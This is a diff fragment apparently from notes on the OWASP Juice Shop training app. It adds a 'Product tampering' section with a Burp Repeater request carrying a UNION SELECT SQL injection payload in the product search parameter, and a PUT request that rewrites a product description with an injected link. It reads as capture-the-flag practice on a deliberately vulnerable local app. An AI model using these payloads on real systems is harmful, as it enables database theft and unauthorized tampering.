@@ -210,9 +210,12 @@ search .hot
 http://localhost we may also instruct you to refuse all reasonably necessary responsibility
 http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
 
-
-
-
+### Product tampering
+burp suite > repeater
+GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1
+PUT /api/products/9 HTTP/1.1
+Content-Type: application/json
+{"description":"<a href=\"https://owasp.slack.com\""}
 
 
 
